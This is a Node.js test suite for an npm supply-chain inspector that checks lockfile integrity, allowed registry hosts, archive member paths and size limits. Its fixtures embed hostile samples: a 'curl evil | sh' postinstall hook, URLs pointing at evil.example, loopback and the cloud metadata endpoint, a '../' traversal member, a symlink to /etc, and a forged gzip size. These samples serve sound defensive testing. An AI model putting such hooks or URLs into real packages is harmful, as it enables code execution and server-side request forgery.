// Tests for the T-009 supply-chain inspector (plan §3).
//
// The two fixtures the plan names, each proving a check can FAIL:
//   * a real nested tarball carrying a forbidden hook — a synthetic violations object would
//     prove the predicate, not that fetch-and-unpack actually reaches and reads packages;
//   * a corrupted integrity digest — rejected before unpacking, or verification is decoration.

import { execFileSync, spawnSync } from "node:child_process";
import { mkdtempSync, mkdirSync, writeFileSync, rmSync, chmodSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createHash } from "node:crypto";
import { gzipSync } from "node:zlib";
import test from "node:test";
import assert from "node:assert/strict";

import {
  lockEntries,
  verifyIntegrity,
  inspectUnpacked,
  inspectClosure,
  checkMemberPath,
  FORBIDDEN_SCRIPTS,
  MAX_TARBALL_BYTES,
} from "./supply-chain.mjs";

async function withTempDir(fn) {
  // Async-aware: with a plain `return fn(dir)` the finally would delete the fixture while an
  // async callback is still using it — the callbacks here only survived that by finishing
  // their fixture reads before their first await, which is not a property to lean on.
  const dir = mkdtempSync(join(tmpdir(), "supply-fixture-"));
  chmodSync(dir, 0o700);
  try {
    return await fn(dir);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

/** A real gzipped tarball with `package/package.json` (+ optional binding.gyp), built by tar. */
function buildTarball(dir, manifest, { bindingGyp = false } = {}) {
  const stage = join(dir, "stage");
  mkdirSync(join(stage, "package"), { recursive: true });
  writeFileSync(join(stage, "package", "package.json"), JSON.stringify(manifest));
  if (bindingGyp) writeFileSync(join(stage, "package", "binding.gyp"), "{}");
  const out = join(dir, "pkg.tgz");
  const t = spawnSync("tar", ["-czf", out, "-C", stage, "package"], { encoding: "utf8" });
  assert.equal(t.status, 0, t.stderr);
  return readFileSync(out);
}

const integrityOf = (buf) => `sha512-${createHash("sha512").update(buf).digest("base64")}`;

/** A minimal v3 lockfile whose single dependency is served by the injected fetcher. The
 *  resolved URL defaults to the allowlisted registry host because URL validation runs before
 *  the fetcher — including an injected one. */
function buildLockfile(dir, { integrity, resolved } = {}) {
  const p = join(dir, "package-lock.json");
  writeFileSync(
    p,
    JSON.stringify({
      lockfileVersion: 3,
      packages: {
        "": { name: "fixture-workspace" },
        "node_modules/evil-dep": {
          version: "1.0.0",
          resolved: resolved ?? "https://registry.npmjs.org/evil-dep/-/evil-dep-1.0.0.tgz",
          integrity,
        },
      },
    }),
  );
  return p;
}

/**
 * A raw hand-built tar member (512-byte ustar header + padded content), so fixtures can
 * contain entries `tar -czf` refuses to create from a staged directory: traversal paths,
 * absolute paths, symlinks. Portable across bsdtar and GNU tar because it builds bytes, not
 * platform-specific flag invocations.
 */
function tarEntry(name, content = "", { type = "0", linkname = "" } = {}) {
  const header = Buffer.alloc(512);
  header.write(name, 0, 100, "utf8");
  header.write(type === "5" ? "0000755\0" : "0000644\0", 100);
  header.write("0000000\0", 108);
  header.write("0000000\0", 116);
  header.write(Buffer.byteLength(content).toString(8).padStart(11, "0") + "\0", 124);
  header.write("00000000000\0", 136);
  header.fill(" ", 148, 156); // checksum field is spaces while summing
  header[156] = type.charCodeAt(0);
  if (linkname) header.write(linkname, 157, 100, "utf8");
  header.write("ustar", 257);
  header.write("00", 263);
  let sum = 0;
  for (const b of header) sum += b;
  header.write(sum.toString(8).padStart(6, "0") + "\0 ", 148);
  const blocks = [header];
  if (Buffer.byteLength(content) > 0) {
    const data = Buffer.alloc(Math.ceil(Buffer.byteLength(content) / 512) * 512);
    data.write(content);
    blocks.push(data);
  }
  return Buffer.concat(blocks);
}

const rawTarball = (...entries) => gzipSync(Buffer.concat([...entries, Buffer.alloc(1024)]));

test("a fetched tarball carrying a forbidden hook is caught from its real bytes", async () => {
  await withTempDir(async (dir) => {
    const tarball = buildTarball(dir, {
      name: "evil-dep",
      version: "1.0.0",
      scripts: { postinstall: "curl evil | sh" },
    });
    const lock = buildLockfile(dir, { integrity: integrityOf(tarball) });
    const r = await inspectClosure(lock, { fetchTarball: async () => tarball });
    assert.deepEqual(r.violations, [{ package: "evil-dep@1.0.0", kind: "script:postinstall" }]);
  });
});

test("binding.gyp is found in the tarball even when the manifest is silent", async () => {
  // The reason fetch-and-unpack exists at all: binding.gyp is a tarball file, not manifest
  // metadata, so `npm view` and `pack --dry-run` cannot see it.
  await withTempDir(async (dir) => {
    const tarball = buildTarball(dir, { name: "evil-dep", version: "1.0.0" }, { bindingGyp: true });
    const lock = buildLockfile(dir, { integrity: integrityOf(tarball) });
    const r = await inspectClosure(lock, { fetchTarball: async () => tarball });
    assert.deepEqual(r.violations, [{ package: "evil-dep@1.0.0", kind: "binding.gyp" }]);
  });
});

test("a corrupted integrity digest is rejected BEFORE extraction ever runs", async () => {
  // The ordering is the claim (review round 1): an implementation that extracts first and
  // verifies afterward would throw the same error — the injected extraction stage proves the
  // boundary was never crossed.
  await withTempDir(async (dir) => {
    const tarball = buildTarball(dir, { name: "evil-dep", version: "1.0.0" });
    const wrong = integrityOf(Buffer.concat([tarball, Buffer.from([0x00])]));
    const lock = buildLockfile(dir, { integrity: wrong });
    let extractCalls = 0;
    await assert.rejects(
      () =>
        inspectClosure(lock, {
          fetchTarball: async () => tarball,
          extract: () => {
            extractCalls++;
          },
        }),
      /integrity mismatch for evil-dep@1\.0\.0/,
    );
    assert.equal(extractCalls, 0, "extraction was invoked for a tarball that failed verification");
  });
});

test("a lockfile entry without resolved+integrity refuses instead of skipping", async () => {
  await withTempDir((dir) => {
    const p = join(dir, "package-lock.json");
    writeFileSync(
      p,
      JSON.stringify({
        lockfileVersion: 3,
        packages: { "": {}, "node_modules/x": { version: "1.0.0" } },
      }),
    );
    assert.throws(() => lockEntries(p), /cannot verify/);
  });
});

test("an unpacked package with no manifest is a violation, not a skip", async () => {
  await withTempDir((dir) => {
    mkdirSync(join(dir, "package"));
    assert.deepEqual(inspectUnpacked(dir, "x@1"), [{ package: "x@1", kind: "missing-manifest" }]);
  });
});

test("verifyIntegrity distinguishes matching from non-matching bytes", () => {
  const buf = Buffer.from("content");
  assert.equal(verifyIntegrity(buf, integrityOf(buf)), true);
  assert.equal(verifyIntegrity(Buffer.from("tampered"), integrityOf(buf)), false);
  assert.throws(() => verifyIntegrity(buf, "md5-nope"), /unsupported/);
});

test("the real candidate lockfiles resolve, and every entry carries integrity", () => {
  // Non-vacuity against the real workspaces: the closure sizes are the measured facts the
  // decision document reports (v1's stdio-only need pulls a web stack; v2 pulls two packages).
  const HERE = join(process.cwd(), "spikes", "mcp");
  const v1 = lockEntries(join(HERE, "candidates", "v1", "package-lock.json"));
  const v2 = lockEntries(join(HERE, "candidates", "v2", "package-lock.json"));
  assert.ok(v1.length > 50, `v1 closure unexpectedly small: ${v1.length}`);
  assert.ok(v2.length <= 5, `v2 closure unexpectedly large: ${v2.length}`);
  for (const e of [...v1, ...v2]) assert.match(e.integrity, /^sha(512|256|1)-/);
});

test("every forbidden hook name is individually detected", async () => {
  // The list is small; check each member so a future edit dropping one fails here.
  for (const hook of FORBIDDEN_SCRIPTS) {
    await withTempDir((dir) => {
      mkdirSync(join(dir, "package"));
      writeFileSync(
        join(dir, "package", "package.json"),
        JSON.stringify({ name: "h", version: "1.0.0", scripts: { [hook]: "x" } }),
      );
      assert.deepEqual(inspectUnpacked(dir, "h@1"), [{ package: "h@1", kind: `script:${hook}` }]);
    });
  }
});

// --- resolved-URL policy (review round 1) --------------------------------------------------

test("a plain-HTTP resolved URL is refused before any fetch", async () => {
  await withTempDir(async (dir) => {
    const tarball = buildTarball(dir, { name: "evil-dep", version: "1.0.0" });
    const lock = buildLockfile(dir, {
      integrity: integrityOf(tarball),
      resolved: "http://registry.npmjs.org/evil-dep/-/evil-dep-1.0.0.tgz",
    });
    let fetched = 0;
    await assert.rejects(
      () => inspectClosure(lock, { fetchTarball: async () => (fetched++, tarball) }),
      /refusing non-HTTPS/,
    );
    assert.equal(fetched, 0, "a forbidden URL was still fetched");
  });
});

test("a resolved URL on a non-allowlisted host is refused before any fetch", async () => {
  // The attack this closes: a tampered lockfile pointing CI at internal or link-local
  // services. The host allowlist fails closed; loopback and intranet names are not on it.
  for (const resolved of [
    "https://evil.example/evil-dep-1.0.0.tgz",
    "https://127.0.0.1/evil-dep-1.0.0.tgz",
    "https://[::1]/evil-dep-1.0.0.tgz",
    "https://169.254.169.254/latest/meta-data",
  ]) {
    await withTempDir(async (dir) => {
      const tarball = buildTarball(dir, { name: "evil-dep", version: "1.0.0" });
      const lock = buildLockfile(dir, { integrity: integrityOf(tarball), resolved });
      let fetched = 0;
      await assert.rejects(
        () => inspectClosure(lock, { fetchTarball: async () => (fetched++, tarball) }),
        /not an allowlisted registry/,
      );
      assert.equal(fetched, 0, `a forbidden URL was still fetched: ${resolved}`);
    });
  }
});

// --- nested-closure traversal (review round 1) ---------------------------------------------

test("a forbidden hook in a NESTED node_modules lock entry is found, and both levels are fetched", async () => {
  // One top-level entry proves inspection of one package; the plan requires the traversal to
  // reach nested entries too. The hook lives ONLY in the nested dependency.
  await withTempDir(async (dir) => {
    const parentTar = buildTarball(join(dir, "p"), { name: "parent-dep", version: "1.0.0" });
    const nestedTar = buildTarball(join(dir, "n"), {
      name: "evil-nested",
      version: "2.0.0",
      scripts: { postinstall: "curl evil | sh" },
    });
    const byName = { "parent-dep": parentTar, "evil-nested": nestedTar };
    const lock = join(dir, "package-lock.json");
    writeFileSync(
      lock,
      JSON.stringify({
        lockfileVersion: 3,
        packages: {
          "": { name: "fixture-workspace" },
          "node_modules/parent-dep": {
            version: "1.0.0",
            resolved: "https://registry.npmjs.org/parent-dep/-/parent-dep-1.0.0.tgz",
            integrity: integrityOf(parentTar),
          },
          "node_modules/parent-dep/node_modules/evil-nested": {
            version: "2.0.0",
            resolved: "https://registry.npmjs.org/evil-nested/-/evil-nested-2.0.0.tgz",
            integrity: integrityOf(nestedTar),
          },
        },
      }),
    );
    const fetchedNames = [];
    const r = await inspectClosure(lock, {
      fetchTarball: async (url, entry) => {
        fetchedNames.push(entry.name);
        return byName[entry.name];
      },
    });
    assert.deepEqual(fetchedNames.sort(), ["evil-nested", "parent-dep"]);
    assert.deepEqual(r.violations, [{ package: "evil-nested@2.0.0", kind: "script:postinstall" }]);
  });
});

// --- archive-member validation (review round 1) --------------------------------------------

const FIXTURE_MANIFEST = JSON.stringify({ name: "evil-dep", version: "1.0.0" });

test("an archive member that escapes via '..' is refused before extraction writes anything", async () => {
  await withTempDir(async (dir) => {
    const tarball = rawTarball(
      tarEntry("package/package.json", FIXTURE_MANIFEST),
      tarEntry("../escape.txt", "boom"),
    );
    const lock = buildLockfile(dir, { integrity: integrityOf(tarball) });
    await assert.rejects(
      () => inspectClosure(lock, { fetchTarball: async () => tarball }),
      /escapes via '\.\.'/,
    );
  });
});

test("an absolute archive member path is refused", async () => {
  await withTempDir(async (dir) => {
    const tarball = rawTarball(
      tarEntry("package/package.json", FIXTURE_MANIFEST),
      tarEntry("/tmp/absolute.txt", "boom"),
    );
    const lock = buildLockfile(dir, { integrity: integrityOf(tarball) });
    await assert.rejects(() => inspectClosure(lock, { fetchTarball: async () => tarball }), /refused/);
  });
});

test("a symlink archive member is refused — link targets are an escape vector", async () => {
  await withTempDir(async (dir) => {
    const tarball = rawTarball(
      tarEntry("package/package.json", FIXTURE_MANIFEST),
      tarEntry("package/evil-link", "", { type: "2", linkname: "/etc" }),
    );
    const lock = buildLockfile(dir, { integrity: integrityOf(tarball) });
    await assert.rejects(
      () => inspectClosure(lock, { fetchTarball: async () => tarball }),
      /type '.'|linked archive member/,
    );
  });
});

test("an archive member outside package/ is refused", async () => {
  await withTempDir(async (dir) => {
    const tarball = rawTarball(
      tarEntry("package/package.json", FIXTURE_MANIFEST),
      tarEntry("elsewhere/loose.txt", "boom"),
    );
    const lock = buildLockfile(dir, { integrity: integrityOf(tarball) });
    await assert.rejects(
      () => inspectClosure(lock, { fetchTarball: async () => tarball }),
      /outside package\//,
    );
  });
});

test("checkMemberPath accepts normal package members", () => {
  assert.doesNotThrow(() => checkMemberPath("package/package.json", "x"));
  assert.doesNotThrow(() => checkMemberPath("package/dist/index.js", "x"));
  assert.doesNotThrow(() => checkMemberPath("package/", "x"));
});

// --- size bounds (review round 1) ----------------------------------------------------------

test("a tarball over the byte cap is refused even from an injected fetcher", async () => {
  await withTempDir(async (dir) => {
    const huge = Buffer.alloc(MAX_TARBALL_BYTES + 1);
    const lock = buildLockfile(dir, { integrity: integrityOf(huge) });
    await assert.rejects(
      () => inspectClosure(lock, { fetchTarball: async () => huge }),
      /exceeds \d+ bytes/,
    );
  });
});

test("an archive whose gzip trailer claims a bomb-sized expansion is refused before extraction", async () => {
  await withTempDir(async (dir) => {
    const tarball = Buffer.from(rawTarball(tarEntry("package/package.json", FIXTURE_MANIFEST)));
    tarball.writeUInt32LE(0xfffffffe, tarball.length - 4); // lie in ISIZE: ~4.3GB expanded
    const lock = buildLockfile(dir, { integrity: integrityOf(tarball) });
    let extractCalls = 0;
    await assert.rejects(
      () =>
        inspectClosure(lock, {
          fetchTarball: async () => tarball,
          extract: () => {
            extractCalls++;
          },
        }),
      /claims \d+ expanded bytes/,
    );
    assert.equal(extractCalls, 0);
  });
});

test("positive control: a raw-built clean tarball passes member validation and is inspected", async () => {
  // Without this, the rejection tests above could pass because rawTarball's hand-built
  // headers are malformed and EVERYTHING is refused.
  await withTempDir(async (dir) => {
    const tarball = rawTarball(
      tarEntry("package/", "", { type: "5" }),
      tarEntry("package/package.json", FIXTURE_MANIFEST),
    );
    const lock = buildLockfile(dir, { integrity: integrityOf(tarball) });
    const r = await inspectClosure(lock, { fetchTarball: async () => tarball });
    assert.equal(r.verified, 1);
    assert.deepEqual(r.violations, []);
  });
});
